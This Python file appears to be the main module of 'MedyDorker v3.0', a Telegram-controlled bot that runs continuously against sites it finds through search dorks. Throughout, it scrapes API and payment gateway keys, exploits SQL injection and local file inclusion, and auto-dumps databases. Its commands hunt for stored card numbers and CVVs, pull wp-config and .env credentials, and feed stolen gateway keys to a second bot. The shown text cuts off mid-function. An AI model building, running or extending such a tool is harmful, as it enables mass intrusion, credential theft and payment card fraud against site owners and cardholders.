"""
MedyDorker v3.0 — Main Pipeline & Telegram Bot

Unified pipeline: Dorker → Scanner → Exploiter → Dumper → Reporter

Commands:
    /start          — Show help
    /dorkon         — Start full pipeline (24/7 mode)
    /dorkoff        — Stop pipeline
    /status         — Current stats & findings
    /dorkstats      — Detailed dorking statistics
    /sqlistats      — SQL injection statistics
    /secrets        — List found secrets/keys
    /dumps          — List data dumps
    /categories     — List available dork categories
    /target <cat>   — Run targeted scan for a category
    /scan <url>     — Scan a single URL
    /deepscan <url> — Deep scan a URL (crawl + extract + SQLi)
"""

import os
import sys
import re
import json
import html as html_mod
import random
import asyncio
import signal
from datetime import datetime
from typing import Dict, List, Optional, Set
from urllib.parse import urlparse

from loguru import logger

# Configure logging
logger.remove()
logger.add(sys.stderr, level="INFO", format="<green>{time:HH:mm:ss}</green> | <level>{level:<7}</level> | {message}")
logger.add("medydorker.log", rotation="10 MB", retention=3, level="DEBUG")

# Telegram setup
try:
    from telegram import Update
    from telegram.ext import Application, CommandHandler, ContextTypes, filters
    HAS_PTB = True
except ImportError:
    HAS_PTB = False
    logger.warning("python-telegram-bot not installed, running without Telegram")

# Local imports
from config_v3 import DorkerConfig
from dork_generator import DorkGenerator
from engines import MultiSearch
from waf_detector import WAFDetector, ProtectionInfo
from sqli_scanner import SQLiScanner, SQLiResult
from sqli_dumper import SQLiDumper, DumpedData
from secret_extractor import SecretExtractor, ExtractedSecret
from reporter import TelegramReporter
from mady_feeder import MadyFeeder, MadyFeederConfig, feed_to_mady


def _esc(text):
    """Escape text for Telegram HTML."""
    if not text:
        return ""
    return html_mod.escape(str(text))


def _safe_send_parts(text, max_len=4000):
    """Split long HTML text into parts without breaking tags."""
    if len(text) <= max_len:
        return [text]
    
    parts = []
    while text:
        if len(text) <= max_len:
            parts.append(text)
            break
        
        # Find a safe split point
        split_at = max_len
        # Try to split at a newline
        newline_pos = text.rfind('\n', 0, max_len)
        if newline_pos > max_len // 2:
            split_at = newline_pos + 1
        
        chunk = text[:split_at]
        
        # Close any unclosed tags in this chunk
        open_tags = []
        i = 0
        while i < len(chunk):
            if chunk[i] == '<':
                end = chunk.find('>', i)
                if end == -1:
                    # Tag not closed in chunk, split before it
                    split_at = i
                    chunk = text[:split_at]
                    break
                tag_content = chunk[i+1:end]
                if tag_content.startswith('/'):
                    # Closing tag
                    tag_name = tag_content[1:].split()[0]
                    if open_tags and open_tags[-1] == tag_name:
                        open_tags.pop()
                elif not tag_content.endswith('/'):
                    # Opening tag
                    tag_name = tag_content.split()[0]
                    if tag_name in ('b', 'i', 'code', 'pre', 'a'):
                        open_tags.append(tag_name)
                i = end + 1
            else:
                i += 1
        
        chunk = text[:split_at]
        # Append closing tags for any unclosed ones
        for tag in reversed(open_tags):
            chunk += f'</{tag}>'
        
        parts.append(chunk)
        
        # Prepend reopening tags for the next chunk
        prefix = ''
        for tag in open_tags:
            prefix += f'<{tag}>'
        text = prefix + text[split_at:]
    
    return parts


class MedyDorkerPipeline:
    """The main v3.0 pipeline: Generate → Search → Detect → Exploit → Dump → Report."""

    def __init__(self, config: DorkerConfig = None):
        self.config = config or DorkerConfig()
        self.running = False
        self._task = None
        
        # Components
        self.generator = DorkGenerator(self.config.params_dir)
        self.searcher = MultiSearch(
            proxies=self._load_proxies(),
            engines=self.config.engines,
        )
        self.waf_detector = WAFDetector(
            timeout=self.config.waf_timeout,
            max_concurrent=self.config.waf_max_concurrent,
        )
        self.sqli_scanner = SQLiScanner(
            timeout=self.config.sqli_timeout,
            max_concurrent=self.config.sqli_max_concurrent,
            delay=self.config.sqli_delay,
        )
        self.dumper = SQLiDumper(
            scanner=self.sqli_scanner,
            output_dir=self.config.dumper_output_dir,
            max_rows=self.config.dumper_max_rows,
            timeout=self.config.dumper_timeout,
        )
        self.secret_extractor = SecretExtractor(
            timeout=self.config.secret_timeout,
            max_concurrent=self.config.secret_max_concurrent,
        )
        self.reporter = TelegramReporter(
            bot_token=self.config.telegram_bot_token,
            chat_id=self.config.telegram_group_id or self.config.telegram_chat_id,
            rate_limit=self.config.reporter_rate_limit,
            batch_size=self.config.reporter_batch_size,
        )
        
        # Mady Bot auto-feed integration
        self.mady_feeder = None
        if self.config.mady_bot_feed:
            try:
                self.mady_feeder = MadyFeeder(MadyFeederConfig(
                    enabled=True,
                    mady_path=self.config.mady_bot_path,
                ))
                logger.info(f"Mady Bot feed enabled: {self.config.mady_bot_path}")
            except Exception as e:
                logger.warning(f"Failed to initialize Mady feeder: {e}")
        
        # State tracking
        self.seen_domains: Set[str] = set()
        self.vulnerable_urls: List[Dict] = []
        self.found_gateways: List[Dict] = []
        self.found_secrets: List[Dict] = []
        self.found_cards: List[Dict] = []
        self.cycle_count = 0
        self.urls_scanned = 0
        self.start_time = None
        
        # Load previous state
        self._load_state()
    
    def _load_proxies(self) -> List[str]:
        """Load proxies from file."""
        if not self.config.use_proxies:
            return []
        try:
            if os.path.exists(self.config.proxy_file):
                with open(self.config.proxy_file) as f:
                    proxies = [line.strip() for line in f if line.strip() and not line.startswith("#")]
                logger.info(f"Loaded {len(proxies)} proxies")
                return proxies
        except Exception as e:
            logger.error(f"Failed to load proxies: {e}")
        return []
    
    def _load_state(self):
        """Load previous run state."""
        try:
            if os.path.exists(self.config.seen_domains_file):
                with open(self.config.seen_domains_file) as f:
                    self.seen_domains = set(line.strip() for line in f if line.strip())
                logger.info(f"Loaded {len(self.seen_domains)} seen domains")
        except Exception as e:
            logger.error(f"Failed to load state: {e}")
    
    def _save_state(self):
        """Save current run state."""
        try:
            with open(self.config.seen_domains_file, "w") as f:
                for domain in self.seen_domains:
                    f.write(domain + "\n")
            
            if self.vulnerable_urls:
                with open(self.config.vulnerable_urls_file, "w") as f:
                    json.dump(self.vulnerable_urls, f, indent=2)
            
            if self.found_gateways:
                with open(self.config.gateway_keys_file, "w") as f:
                    json.dump(self.found_gateways, f, indent=2)
        except Exception as e:
            logger.error(f"Failed to save state: {e}")
    
    def _should_skip_url(self, url: str) -> bool:
        """Check if URL should be skipped."""
        try:
            parsed = urlparse(url)
            domain = parsed.netloc.lower()
            
            for skip in self.config.skip_domains:
                if skip in domain:
                    return True
            
            return False
        except:
            return True

    async def process_url(self, url: str) -> Dict:
        """Process a single URL through the full pipeline.
        
        Steps:
        1. WAF Detection
        2. Secret Extraction  
        3. SQLi Testing
        4. Data Dumping (if injectable)
        5. Report findings
        
        Returns:
            Dict with all findings
        """
        result = {
            "url": url,
            "timestamp": datetime.now().isoformat(),
            "waf": None,
            "secrets": [],
            "sqli": [],
            "lfi": [],
            "dumps": [],
        }
        
        domain = urlparse(url).netloc
        self.seen_domains.add(domain)
        self.urls_scanned += 1
        self.reporter.stats.urls_scanned += 1
        
        import aiohttp
        timeout = aiohttp.ClientTimeout(total=self.config.validation_timeout)
        
        try:
            async with aiohttp.ClientSession(timeout=timeout, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }) as session:
                
                # Step 1: WAF Detection
                if self.config.waf_detection_enabled:
                    waf_info = await self.waf_detector.detect(url, session)
                    result["waf"] = {
                        "name": waf_info.waf,
                        "cdn": waf_info.cdn,
                        "bot_protection": waf_info.bot_protection,
                        "risk": waf_info.risk_level,
                        "cms": waf_info.cms,
                    }
                    
                    # Skip if too protected
                    if self.config.waf_skip_extreme and waf_info.risk_level == "extreme":
                        logger.info(f"Skipping {url} — extreme protection ({waf_info.waf or waf_info.bot_protection})")
                        return result
                    if self.config.waf_skip_high and waf_info.risk_level == "high":
                        logger.info(f"Skipping {url} — high protection ({waf_info.waf})")
                        return result
                
                # Step 2: Secret Extraction (deep — checks payment pages too)
                if self.config.secret_extraction_enabled:
                    scan_data = await self.secret_extractor.deep_extract_site(url, session)
                    secrets = scan_data.get("secrets", []) if isinstance(scan_data, dict) else scan_data
                    if secrets:
                        result["secrets"] = [
                            {"type": s.type, "name": s.key_name, "value": s.value, "category": s.category}
                            for s in secrets
                        ]
                        
                        # Report each secret
                        for secret in secrets:
                            if secret.category == "gateway":
                                self.found_gateways.append({
                                    "url": url,
                                    "type": secret.type,
                                    "value": secret.value,
                                    "time": datetime.now().isoformat(),
                                })
                                await self.reporter.report_gateway(
                                    url, secret.type, secret.value,
                                    {"confidence": secret.confidence}
                                )
                                # Feed to Mady Bot
                                if self.mady_feeder:
                                    self.mady_feeder.feed_gateway(url, secret.type, secret.value)
                            else:
                                self.found_secrets.append({
                                    "url": url,
                                    "type": secret.type,
                                    "value": secret.value,
                                    "time": datetime.now().isoformat(),
                                })
                                if secret.confidence >= 0.80:
                                    await self.reporter.report_secret(
                                        url, secret.type, secret.key_name,
                                        secret.value, secret.category,
                                    )
                
                # Step 3: SQLi Testing
                if self.config.sqli_enabled:
                    sqli_results = await self.sqli_scanner.scan(url, session)
                    if sqli_results:
                        result["sqli"] = [
                            {
                                "param": r.parameter,
                                "type": r.injection_type,
                                "dbms": r.dbms,
                                "technique": r.technique,
                                "columns": r.column_count,
                                "db_version": r.db_version,
                                "current_db": r.current_db,
                            }
                            for r in sqli_results
                        ]
                        
                        for sqli in sqli_results:
                            self.vulnerable_urls.append({
                                "url": url,
                                "param": sqli.parameter,
                                "type": sqli.injection_type,
                                "dbms": sqli.dbms,
                                "time": datetime.now().isoformat(),
                            })
                            
                            # Report vulnerability
                            await self.reporter.report_sqli_vuln(
                                url, sqli.parameter, sqli.dbms,
                                sqli.injection_type,
                                {
                                    "db_version": sqli.db_version,
                                    "current_db": sqli.current_db,
                                    "column_count": sqli.column_count,
                                }
                            )
                            
                            # Step 4: Data Dumping (if union-based injection found)
                            if self.config.dumper_enabled and sqli.injection_type == "union":
                                dump = await self.dumper.targeted_dump(sqli, session)
                                if dump.has_valuable_data or dump.total_rows > 0:
                                    saved = self.dumper.save_dump(dump)
                                    result["dumps"].append({
                                        "tables": len(dump.tables),
                                        "rows": dump.total_rows,
                                        "cards": len(dump.card_data),
                                        "creds": len(dump.credentials),
                                        "keys": len(dump.gateway_keys),
                                        "files": saved,
                                    })
                                    
                                    # Report dump
                                    await self.reporter.report_data_dump(
                                        url, dump.dbms, dump.database,
                                        dump.tables,
                                        {t: len(rows) for t, rows in dump.data.items()},
                                        saved,
                                    )
                                    
                                    # Report card data specifically
                                    if dump.card_data:
                                        self.found_cards.extend(dump.card_data)
                                        await self.reporter.report_card_data(url, dump.card_data)
                                    
                                    # Report gateway keys from dump
                                    for key_entry in dump.gateway_keys:
                                        for col, val in key_entry.items():
                                            self.found_gateways.append({
                                                "url": url,
                                                "type": f"db_{col}",
                                                "value": val,
                                                "source": "sqli_dump",
                                                "time": datetime.now().isoformat(),
                                            })
                                            await self.reporter.report_gateway(
                                                url, f"DB: {col}", val,
                                                {"source": "SQL injection dump"}
                                            )
                                            # Feed to Mady Bot
                                            if self.mady_feeder:
                                                self.mady_feeder.feed_gateway(url, f"db_{col}", val)
                
                # Step 5: LFI Testing (on URLs with parameters)
                if "=" in url:
                    try:
                        lfi_result = await self.sqli_scanner.test_lfi(url, session)
                        if lfi_result.get("vulnerable"):
                            result["lfi"].append({
                                "url": url,
                                "technique": lfi_result.get("technique"),
                                "files_found": len(lfi_result.get("files_found", [])),
                                "sensitive_data": lfi_result.get("sensitive_data", []),
                            })
                            
                            # Report LFI finding
                            await self.reporter.report_secret(
                                url,
                                "LFI_VULNERABILITY",
                                f"Technique: {lfi_result.get('technique')} | Files: {len(lfi_result.get('files_found', []))}",
                                "critical",
                                {"sensitive_data": lfi_result.get("sensitive_data", [])}
                            )
                            
                            logger.warning(f"🔥 LFI FOUND: {url} — {lfi_result.get('technique')}")
                    except Exception as lfi_err:
                        logger.debug(f"LFI test error for {url}: {lfi_err}")
        
        except Exception as e:
            logger.error(f"Pipeline error for {url}: {e}")
        
        return result

    async def run_dork_cycle(self, dorks: List[str] = None, category: str = None):
        """Run one cycle of dorking + processing.
        
        Args:
            dorks: Optional specific dorks to use (otherwise generates all)
            category: Optional category for targeted generation
        """
        self.cycle_count += 1
        logger.info(f"=== CYCLE {self.cycle_count} STARTING ===")
        
        # Generate dorks
        if dorks is None:
            if category:
                dorks = self.generator.generate_targeted(category, max_count=500)
            else:
                dorks = self.generator.generate_all(
                    max_total=self.config.max_dorks,
                    max_per_pattern=self.config.max_per_pattern,
                )
        
        if self.config.dork_shuffle:
            random.shuffle(dorks)
        
        logger.info(f"Processing {len(dorks)} dorks this cycle")
        
        for i, dork in enumerate(dorks):
            if not self.running:
                logger.info("Pipeline stopped, breaking cycle")
                break
            
            self.reporter.stats.dorks_processed += 1
            
            try:
                # Search for URLs
                urls = await self.searcher.search(dork, self.config.results_per_dork)
                
                if not urls:
                    continue
                
                # Filter URLs
                filtered_urls = []
                for url in urls:
                    if self._should_skip_url(url):
                        continue
                    domain = urlparse(url).netloc
                    if domain in self.seen_domains:
                        continue
                    filtered_urls.append(url)
                
                if not filtered_urls:
                    continue
                
                logger.info(f"[{i+1}/{len(dorks)}] Dork: {dork[:60]}... → {len(filtered_urls)} new URLs")
                
                # Process each URL through the pipeline
                for url in filtered_urls:
                    if not self.running:
                        break
                    
                    result = await self.process_url(url)
                    
                    # Log findings
                    findings = []
                    if result.get("secrets"):
                        findings.append(f"{len(result['secrets'])} secrets")
                    if result.get("sqli"):
                        findings.append(f"{len(result['sqli'])} SQLi vulns")
                    if result.get("lfi"):
                        findings.append(f"{len(result['lfi'])} LFI vulns")
                    if result.get("dumps"):
                        findings.append(f"{len(result['dumps'])} dumps")
                    
                    if findings:
                        logger.info(f"  FOUND: {', '.join(findings)} at {url[:60]}")
                
                # Delay between dorks
                delay = random.uniform(
                    self.config.search_delay_min,
                    self.config.search_delay_max,
                )
                await asyncio.sleep(delay)
                
            except Exception as e:
                logger.error(f"Dork cycle error: {e}")
                continue
        
        # Save state after cycle
        self._save_state()
        logger.info(f"=== CYCLE {self.cycle_count} COMPLETE — "
                    f"{self.urls_scanned} URLs scanned, "
                    f"{len(self.found_gateways)} gateways, "
                    f"{len(self.vulnerable_urls)} SQLi vulns ===")

    async def start(self):
        """Start the full pipeline in continuous mode."""
        if self.running:
            return
        
        self.running = True
        self.start_time = datetime.now()
        
        logger.info("🚀 MedyDorker v3.0 Starting...")
        
        # Send startup notification
        await self.reporter.report_startup({
            "Dorks Available": len(self.generator.generate_all(50000)),
            "Engines": ", ".join(self.config.engines),
            "SQLi": "Enabled" if self.config.sqli_enabled else "Disabled",
            "Dumper": "Enabled" if self.config.dumper_enabled else "Disabled",
            "WAF Detection": "Enabled" if self.config.waf_detection_enabled else "Disabled",
        })
        
        # Start status reporter
        status_task = asyncio.create_task(self._status_loop())
        
        try:
            cycle = 0
            while self.running:
                cycle += 1
                
                if self.config.max_cycles > 0 and cycle > self.config.max_cycles:
                    logger.info(f"Max cycles ({self.config.max_cycles}) reached")
                    break
                
                await self.run_dork_cycle()
                
                if self.running and self.config.continuous:
                    logger.info(f"Cycle complete, waiting {self.config.cycle_delay}s before next...")
                    await asyncio.sleep(self.config.cycle_delay)
                else:
                    break
        
        except asyncio.CancelledError:
            logger.info("Pipeline cancelled")
        except Exception as e:
            logger.error(f"Pipeline error: {e}")
            await self.reporter.report_error(str(e), "main pipeline")
        finally:
            status_task.cancel()
            self._save_state()
            self.running = False
            logger.info("Pipeline stopped")

    async def stop(self):
        """Stop the pipeline."""
        self.running = False
        self._save_state()
        logger.info("Pipeline stop requested")

    async def _status_loop(self):
        """Periodically send status updates."""
        while self.running:
            try:
                await asyncio.sleep(self.config.reporter_status_interval)
                if self.running:
                    await self.reporter.report_status({
                        "Cycle": self.cycle_count,
                        "Seen Domains": len(self.seen_domains),
                        "Found Gateways": len(self.found_gateways),
                        "Found Cards": len(self.found_cards),
                    })
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Status loop error: {e}")

    def get_stats(self) -> Dict:
        """Get current statistics."""
        uptime = ""
        if self.start_time:
            delta = datetime.now() - self.start_time
            hours = int(delta.total_seconds() // 3600)
            minutes = int((delta.total_seconds() % 3600) // 60)
            uptime = f"{hours}h {minutes}m"
        
        return {
            "running": self.running,
            "uptime": uptime,
            "cycles": self.cycle_count,
            "urls_scanned": self.urls_scanned,
            "seen_domains": len(self.seen_domains),
            "gateways_found": len(self.found_gateways),
            "secrets_found": len(self.found_secrets),
            "sqli_vulns": len(self.vulnerable_urls),
            "cards_found": len(self.found_cards),
            **self.reporter.get_stats(),
        }


# ==================== TELEGRAM BOT HANDLERS ====================

pipeline: Optional[MedyDorkerPipeline] = None


def get_pipeline() -> MedyDorkerPipeline:
    """Get or create the pipeline instance."""
    global pipeline
    if pipeline is None:
        pipeline = MedyDorkerPipeline()
    return pipeline


async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command."""
    text = (
        "🔥 <b>MedyDorker v3.0</b> 🔥\n"
        "\n"
        "<b>Full Exploitation Pipeline:</b>\n"
        "Dorker → Scanner → Exploiter → Dumper → Reporter\n"
        "\n"
        "<b>Commands:</b>\n"
        "/dorkon — Start full pipeline (24/7)\n"
        "/dorkoff — Stop pipeline\n"
        "/status — Current stats + Mady feed status\n"
        "/dorkstats — Detailed dork stats\n"
        "/sqlistats — SQLi stats\n"
        "/secrets — Found secrets/keys\n"
        "/dumps — Data dumps\n"
        "/categories — Dork categories\n"
        "/target &lt;cat&gt; — Targeted scan\n"
        "/scan &lt;url&gt; — <b>MAX DEPTH</b> scan single URL\n"
        "/adminfinder &lt;domain&gt; — Find admin panels\n"
        "/lfi &lt;url&gt; — 📂 LFI scanner (206 paths)\n"
        "/lfiextract &lt;url&gt; — 🔓 Extract wp-config, .env\n"
        "/cardhunt &lt;url&gt; — 💳 Hunt card data via SQLi\n"
        "/masscheck — 📋 Mass scan URLs (file/list)\n"
        "/jobs — View active background jobs\n"
        "\n"
        "<b>/scan - MAX DEPTH by default:</b>\n"
        "  • 100+ page deep crawl\n"
        "  • All JS files scanned\n"
        "  • Full endpoint discovery\n"
        "  • SQLi testing + auto-dump\n"
        "  • 345+ XDumpGO patterns\n"
        "\n"
        "<b>/scan Options (to limit):</b>\n"
        "  <code>quick</code> — Faster scan (10 pages)\n"
        "  <code>nosqli</code> — Skip SQLi testing\n"
        "  <code>nodump</code> — No auto-dump on SQLi\n"
        "\n"
        "<b>/adminfinder:</b>\n"
        "  • 100+ admin path dictionary\n"
        "  • SQLi Dumper techniques\n"
        "  • CMS detection (WP, Joomla, etc.)\n"
        "\n"
        "<b>/lfi:</b>\n"
        "  • 206 sensitive file paths\n"
        "  • 17 traversal techniques\n"
        "  • PHP wrappers (php://filter)\n"
        "  • Detects passwd, configs, logs\n"
        "\n"
        "<b>/lfiextract:</b>\n"
        "  • Exploits LFI to extract files\n"
        "  • Parses wp-config.php → DB creds\n"
        "  • Parses .env → API keys/secrets\n"
        "  • Lists SSH targets from /etc/passwd\n"
        "\n"
        "<b>/cardhunt:</b>\n"
        "  • Finds card tables (pan, ccnum, cvv...)\n"
        "  • Luhn validation for real cards\n"
        "  • Card type detection (Visa/MC/Amex...)\n"
        "  • SQLi Dumper format export\n"
        "\n"
        "<b>/masscheck:</b> (CONCURRENT!)\n"
        "  • Scan 100s of URLs at once\n"
        "  • Upload .txt file or paste URLs\n"
        "  • Runs in background — /dorkon continues!\n"
        "  • 10 URLs scanned simultaneously\n"
        "\n"
        "<b>Features:</b>\n"
        "• 50K+ dynamic dorks (XDumpGO-style)\n"
        "• 7 search engines with fallback\n"
        "• WAF/CDN detection (60+ signatures)\n"
        "• SQLi exploitation (error/union/blind)\n"
        "• <b>WAF Bypass</b> (SQLi Dumper obfuscation)\n"
        "• DIOS data extraction\n"
        "• 🔑 XDumpGO-complete secret scanner\n"
        "  └─ 345+ patterns: 60 gateways, 30 cloud,\n"
        "     50 APIs, 20 crypto, webhooks, more!\n"
        "• Real-time Telegram reporting\n"
        "• 🤖 Auto-feed to Mady Bot for testing\n"
    )
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_dorkon(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /dorkon command — start pipeline."""
    p = get_pipeline()
    if p.running:
        await update.message.reply_text("⚠️ Pipeline already running! Use /status to check.")
        return
    
    await update.message.reply_text("🚀 Starting MedyDorker v3.0 pipeline...")
    
    # Start in background
    asyncio.create_task(p.start())


async def cmd_dorkoff(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /dorkoff command — stop pipeline."""
    p = get_pipeline()
    if not p.running:
        await update.message.reply_text("Pipeline is not running.")
        return
    
    await p.stop()
    await update.message.reply_text("🛑 Pipeline stopped.")


async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /status command."""
    p = get_pipeline()
    stats = p.get_stats()
    
    status = "🟢 RUNNING" if stats["running"] else "🔴 STOPPED"
    
    # Get Mady feeder stats
    mady_status = "❌ Disabled"
    mady_fed = 0
    if p.mady_feeder:
        mady_stats = p.mady_feeder.get_stats()
        mady_status = "✅ Enabled"
        mady_fed = mady_stats.get('keys_fed_this_session', 0)
    
    text = (
        f"📊 <b>MedyDorker v3.0 Status</b>\n"
        f"\n"
        f"<b>State:</b> {status}\n"
        f"<b>Uptime:</b> {stats.get('uptime', 'N/A')}\n"
        f"<b>Cycles:</b> {stats['cycles']}\n"
        f"\n"
        f"<b>📈 Scanning:</b>\n"
        f"  URLs Scanned: {stats['urls_scanned']}\n"
        f"  Domains Seen: {stats['seen_domains']}\n"
        f"  Dorks Processed: {stats.get('dorks_processed', 0)}\n"
        f"\n"
        f"<b>🎯 Findings:</b>\n"
        f"  🔑 Gateways: {stats['gateways_found']}\n"
        f"  💳 Card Data: {stats['cards_found']}\n"
        f"  🔓 SQLi Vulns: {stats['sqli_vulns']}\n"
        f"  🔐 Secrets: {stats['secrets_found']}\n"
        f"\n"
        f"<b>🤖 Mady Bot Feed:</b> {mady_status}\n"
        f"  Keys Fed: {mady_fed}\n"
        f"\n"
        f"<b>📨 Messages:</b> {stats.get('messages_sent', 0)}\n"
        f"<b>❌ Errors:</b> {stats.get('errors', 0)}\n"
    )
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_dorkstats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /dorkstats command."""
    p = get_pipeline()
    gen_stats = p.generator.get_stats()
    
    text = (
        f"🔍 <b>Dork Generator Stats</b>\n"
        f"\n"
        f"<b>Patterns:</b> {gen_stats['patterns']}\n"
        f"<b>Static Dorks:</b> {gen_stats['static_dorks']}\n"
        f"\n"
        f"<b>Parameter Files:</b>\n"
    )
    for param, count in gen_stats["param_counts"].items():
        text += f"  {param}: {count} entries\n"
    
    text += (
        f"\n<b>Max Combinations:</b> {gen_stats['total_possible_combinations']:,}\n"
        f"<b>Categories:</b> {', '.join(gen_stats['categories'])}\n"
    )
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_sqlistats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /sqlistats command."""
    p = get_pipeline()
    
    text = (
        f"🔓 <b>SQLi Statistics</b>\n"
        f"\n"
        f"<b>Total Vulns Found:</b> {len(p.vulnerable_urls)}\n"
        f"\n"
    )
    
    if p.vulnerable_urls:
        text += "<b>Recent Vulnerabilities:</b>\n"
        for vuln in p.vulnerable_urls[-10:]:
            text += (
                f"\n<code>{vuln['url']}</code>\n"
                f"  Param: {vuln['param']} | Type: {vuln['type']} | DBMS: {vuln['dbms']}\n"
            )
    else:
        text += "No SQLi vulnerabilities found yet."
    
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_secrets(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /secrets command."""
    p = get_pipeline()
    
    text = f"🔐 <b>Found Secrets</b> ({len(p.found_gateways)} gateways, {len(p.found_secrets)} other)\n\n"
    
    if p.found_gateways:
        text += "<b>🔑 Gateway Keys:</b>\n"
        for gw in p.found_gateways[-15:]:
            text += (
                f"  <b>{gw['type']}</b>\n"
                f"  <code>{gw['value']}</code>\n"
                f"  📍 {gw['url']}\n\n"
            )
    
    if p.found_secrets:
        text += "\n<b>🔐 Other Secrets:</b>\n"
        for sec in p.found_secrets[-10:]:
            text += (
                f"  <b>{sec['type']}</b>\n"
                f"  <code>{sec['value']}</code>\n\n"
            )
    
    if not p.found_gateways and not p.found_secrets:
        text += "No secrets found yet. Start pipeline with /dorkon"
    
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_dumps(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /dumps command."""
    p = get_pipeline()
    
    dump_dir = p.config.dumper_output_dir
    text = f"📦 <b>Data Dumps</b>\n\n"
    
    if os.path.exists(dump_dir):
        files = sorted(os.listdir(dump_dir), reverse=True)[:20]
        if files:
            for f in files:
                fpath = os.path.join(dump_dir, f)
                size = os.path.getsize(fpath)
                text += f"📁 <code>{f}</code> ({size:,} bytes)\n"
        else:
            text += "No dumps yet."
    else:
        text += "Dump directory not created yet."
    
    text += f"\n<b>Cards Found:</b> {len(p.found_cards)}"
    
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_categories(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /categories command."""
    text = (
        "🎯 <b>Available Categories</b>\n"
        "\n"
        "<b>Primary (Card/Gateway focus):</b>\n"
        "  💳 <code>cards</code> — Card numbers, CVVs, expiry dates\n"
        "  🔑 <code>gateways</code> — Stripe, Braintree, PayPal keys\n"
        "\n"
        "<b>Secondary:</b>\n"
        "  🔐 <code>secrets</code> — API keys, tokens, credentials\n"
        "  🔓 <code>sqli</code> — SQL injection targets\n"
        "  🗄️ <code>databases</code> — Exposed databases\n"
        "  ☁️ <code>cloud</code> — Cloud misconfigurations\n"
        "\n"
        "Use: /target &lt;category&gt;\n"
        "Example: /target cards"
    )
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /target <category> command."""
    p = get_pipeline()
    
    if not context.args:
        await update.message.reply_text("Usage: /target <category>\nSee /categories for options.")
        return
    
    category = context.args[0].lower()
    valid = ["cards", "gateways", "secrets", "sqli", "databases", "cloud"]
    
    if category not in valid:
        await update.message.reply_text(f"Invalid category. Valid: {', '.join(valid)}")
        return
    
    await update.message.reply_text(f"🎯 Starting targeted scan for: <b>{category}</b>", parse_mode="HTML")
    
    # Run in background
    async def targeted_task():
        dorks = p.generator.generate_targeted(category, max_count=500)
        p.running = True
        await p.run_dork_cycle(dorks=dorks, category=category)
        p.running = False
    
    asyncio.create_task(targeted_task())


async def cmd_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /scan <url> [options] command — MAXIMUM DEPTH site scan.
    
    By default performs:
        - Deep crawl (100+ internal pages)
        - All JS file scanning for secrets
        - Full endpoint discovery (AJAX, REST, forms, params)
        - SQLi testing on all discovered endpoints
        - LFI testing on parameter URLs (206 paths)
        - Auto-dump on successful injection
        - 345+ secret patterns (XDumpGO-complete)
    
    Supports:
        /scan url1 url2 url3...          — Space-separated URLs
        /scan (attach .txt file)         — URLs from attached text file
        /scan (reply to .txt file)       — URLs from replied-to text file
        /scan quick (reply to file)      — File scan with options
    
    Options:
        quick   — Faster scan (10 pages, fewer tests)
        nosqli  — Skip SQLi testing (secrets only)
        nodump  — Don't auto-dump on SQLi (just report vuln)
        nolfi   — Skip LFI testing
        
    Examples:
        /scan example.com           (full maximum depth)
        /scan example.com quick     (faster, less thorough)
        /scan example.com nosqli    (secrets only, no SQLi)
        /scan (attach urls.txt)     (mass scan from file)
    """
    p = get_pipeline()
    
    # Check for file attachment (direct or reply) FIRST
    file_urls = []
    if update.message.document:
        try:
            file = await update.message.document.get_file()
            file_bytes = await file.download_as_bytearray()
            content = file_bytes.decode('utf-8', errors='ignore')
            file_urls = [line.strip() for line in content.splitlines() 
                        if line.strip() and not line.startswith('#')]
        except Exception as e:
            await update.message.reply_text(f"❌ Error reading attached file: {e}")
            return
    elif update.message.reply_to_message and update.message.reply_to_message.document:
        try:
            file = await update.message.reply_to_message.document.get_file()
            file_bytes = await file.download_as_bytearray()
            content = file_bytes.decode('utf-8', errors='ignore')
            file_urls = [line.strip() for line in content.splitlines() 
                        if line.strip() and not line.startswith('#')]
        except Exception as e:
            await update.message.reply_text(f"❌ Error reading replied file: {e}")
            return
    # Also check if reply-to message has text with URLs (paste list)
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        reply_text = update.message.reply_to_message.text
        for line in reply_text.splitlines():
            line = line.strip()
            if line and ('.' in line) and not line.startswith('#') and not line.startswith('/'):
                file_urls.append(line)
    
    if not context.args and not file_urls:
        await update.message.reply_text(
            "<b>Usage:</b> /scan &lt;url&gt; [options]\n\n"
            "<b>Default (MAX DEPTH):</b>\n"
            "  • 100+ page deep crawl\n"
            "  • All JS files scanned\n"
            "  • Full endpoint discovery\n"
            "  • SQLi testing + auto-dump\n"
            "  • LFI testing (206 paths)\n"
            "  • 345+ XDumpGO secret patterns\n\n"
            "<b>Options (to limit):</b>\n"
            "  <code>quick</code> — Faster scan (10 pages)\n"
            "  <code>nosqli</code> — Skip SQLi testing\n"
            "  <code>nodump</code> — No auto-dump on SQLi\n"
            "  <code>nolfi</code> — Skip LFI testing\n\n"
            "<b>Input methods:</b>\n"
            "  /scan example.com\n"
            "  /scan (attach .txt file with URLs)\n"
            "  /scan (reply to .txt file)\n"
            "  /scan (reply to pasted URL list)\n\n"
            "<b>Examples:</b>\n"
            "  /scan example.com\n"
            "  /scan example.com quick\n"
            "  /scan quick nosqli (reply to file)",
            parse_mode="HTML"
        )
        return
    
    # Separate URLs from options (from command args)
    urls = []
    options = []
    for arg in (context.args or []):
        arg_lower = arg.lower()
